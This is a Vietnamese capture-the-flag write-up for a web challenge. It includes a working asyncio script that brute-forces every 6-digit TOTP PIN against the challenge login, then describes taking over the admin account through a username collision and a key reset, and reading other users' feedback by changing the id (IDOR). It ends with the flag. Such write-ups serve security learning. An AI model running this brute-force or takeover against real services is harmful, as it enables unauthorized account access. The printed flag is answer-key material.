# Dumb-factor Authentication

## Overview

Đây là challenge về lỗ hổng OTP, và lỗi sai trong cài đặt

## Qúa trình giải

Khi đọc 2 post public của server, mình biết được bài này sử dụng TOTP để xác thực người dùng, mỗi khi ta nhập PIN gồm 6 chữ số, hệ thống sẽ lấy PIN đó đi dò với secret key của users, cái nào khớp thì ta được đăng nhập vào users đó.

Mình cũng biết thêm hệ thống có khoảng 1000 users, vì thế trong 30s (thời gian otp reset) ta cần phải dò ít nhất 1000 mã PIN thì khả năng thành công được một mã.

Nhưng vấn đề là thư viện requests của python quá chậm để làm điều đó, sau khi tìm hiểu thì mình có biết đến thư viện [asyncio](https://jonlu.ca/posts/async-python-http) giúp tăng tốc độ gửi req

Đây là code mình dùng để BruteForce mã PIN

```python
import asyncio
import aiohttp

URL = "https://dumb-factor-authentication-618f7c21ea46ca97-global.challs.brunnerne.xyz/login"
LIMIT = 20

async def try_pin(session, pin):
    pin_str = f"{pin:06d}"
    while True:
        try:
            # force_close to avoid keep-alive disconnects
            async with session.post(URL, data={"pin": pin_str}) as response:
                return pin_str, await response.text()
        except Exception:
            await asyncio.sleep(0.5)

async def brute_force():
    headers = {"Connection": "close"}
    async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(limit_per_host=LIMIT, force_close=True)) as session:
        tasks = set()
        next_pin = 0
        
        while next_pin < 1_000_000 or tasks:
            while len(tasks) < LIMIT and next_pin < 1_000_000:
                tasks.add(asyncio.create_task(try_pin(session, next_pin)))
                next_pin += 1
                
            done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            
            for task in done:
                pin, text = task.result()
                if "invalid pin" not in text.lower():
                    print(pin)
                    for t in tasks: t.cancel()
                    return

if __name__ == "__main__":
    asyncio.run(brute_force())
```

Ở đây mình dò được mã PIN `000269`

Sau khi dô được, mình đọc được 2 post bị che và biết thêm một số thông tin:
-  ```
    Following the launch of our simplified passwordless single-factor TOTP login system, we have noticed some minor login issues due to username collisions. Please make sure your username on the settings dashboard is completely unique.
    ```

- Tức là theo mình hiểu, hệ thống đã có vấn đề đăng nhập với việc các tài khoản trùng tên nhau, bình thường một hệ thống sử dụng OTP sẽ đi so sánh PIN với user id, nhưng chắc là ở đây người ta so sánh với username, nên xảy ra tình trạng như vậy

Do đó nếu mình đổi username thành admin, có lẽ khi đăng nhập sẽ vô được tài khoản admin

Ở trang `/settings`, có 2 chức năng là **update username** và **reset key**. Backend sẽ xử lí như sau khi ta ấn nút reset key:
- Tìm tài khoản có tên admin và cập nhật key mới cho tài khoản đó, sau đó hiển thị mã QR
- Ta lấy điện thoại quét mã thì sẽ ra mã OTP theo thời gian.

TIếp theo, mình chỉ việc logout, lấy OTP và đăng nhập vào thì vào được admin account.

Tới đây thì có lẽ gần như là xong, mình thử chức năng `Feedback`, khi post lên thì thấy 
`/feedback/view?id=25`, thế là mình sửa id để xem những post trước, phát hiện ra có post id 24 chứa flag

> FLAG: brunner{ch1ef_duck_0ff1c3r_4ppr0v3d_th1s_fl4g}